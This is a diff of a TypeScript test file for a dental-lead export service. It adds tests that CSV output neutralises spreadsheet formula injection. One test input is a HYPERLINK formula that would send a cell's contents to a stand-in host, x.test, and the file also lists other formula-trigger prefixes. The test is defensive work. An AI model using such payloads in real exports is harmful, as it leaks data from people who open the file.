@@ -1,4 +1,4 @@
-import type { LeadDto } from '@dentaltrack/shared';
+import { csvCell, type LeadDto } from '@dentaltrack/shared';
 import * as ExcelJS from 'exceljs';
 import { LeadsExportService } from './leads-export.service';
 
@@ -42,6 +42,16 @@ describe('LeadsExportService', () => {
     expect(file.buffer.toString('utf8')).toContain('"Silva, ""Jr"" João"');
   });
 
+  it('csv: nome que começa como fórmula sai como texto', async () => {
+    const file = await service.export(
+      [{ ...LEAD, name: '=HYPERLINK("http://x.test/?"&A2;"Abrir")' }],
+      'csv',
+    );
+    const text = file.buffer.toString('utf8');
+    expect(text).toContain(`"'=HYPERLINK(""http://x.test/?""&A2;""Abrir"")"`);
+    expect(text).not.toMatch(/(^|,)=HYPERLINK/m);
+  });
+
   it('xlsx: gera planilha legível pelo exceljs com os dados do lead', async () => {
     const file = await service.export([LEAD], 'xlsx');
     expect(file.contentType).toContain('spreadsheetml');
@@ -64,5 +74,27 @@ describe('LeadsExportService', () => {
     expect(file.contentType).toBe('application/pdf');
     expect(file.buffer.subarray(0, 5).toString('latin1')).toBe('%PDF-');
     expect(file.buffer.length).toBeGreaterThan(1000);
+  });
+});
+
+describe('csvCell (célula de CSV segura para planilha)', () => {
+  it.each([
+    ['=1+1', "'=1+1"],
+    ['+55 11 90000-0000', "'+55 11 90000-0000"],
+    ['-2+3', "'-2+3"],
+    ['@SUM(A1)', "'@SUM(A1)"],
+    ['\tcmd', "'\tcmd"],
+  ])('%p vira texto', (value, expected) => {
+    expect(csvCell(value)).toBe(expected);
+  });
+
+  it('\\r no início também é neutralizado, e vai entre aspas', () => {
+    expect(csvCell('\r=1')).toBe(`"'\r=1"`);
+  });
+
+  it('texto comum passa igual; vírgula e aspas continuam escapadas', () => {
+    expect(csvCell('João Silva')).toBe('João Silva');
+    expect(csvCell('a,b')).toBe('"a,b"');
+    expect(csvCell('Maria=Souza')).toBe('Maria=Souza');
   });
 });
